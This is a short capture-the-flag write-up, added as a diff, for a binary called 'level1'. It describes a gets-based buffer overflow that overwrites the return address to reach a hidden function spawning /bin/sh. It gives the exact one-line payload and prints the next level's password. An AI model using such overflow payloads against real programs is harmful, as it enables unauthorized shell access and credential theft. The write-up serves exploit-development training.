@@ -1,0 +1,13 @@
+The level1 executable found in the home folder seems to wait for user input, we found after some tests that it crashes when the size of the input exceeds 75 characters.
+We then tried to run arbitrary code by overriding the eip register through buffer overflow, we then noticed that there were an unused function in the program, `run`.
+This function, when we disassemble it, appears to run `system` with "/bin/sh" as its argument, we can then simply takes its address, and add it after the 76 characters required to crash the program.
+
+(python -c "print 'A' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
+
+The address is reversed due to it being in little endian, the `cat` is required since `gets` used in the program closes stdin, which we need to reopen.
+
+We can then run `whoami` in the newly opened shell, where we can see we are `level2`
+
+cd ../level2
+cat .pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
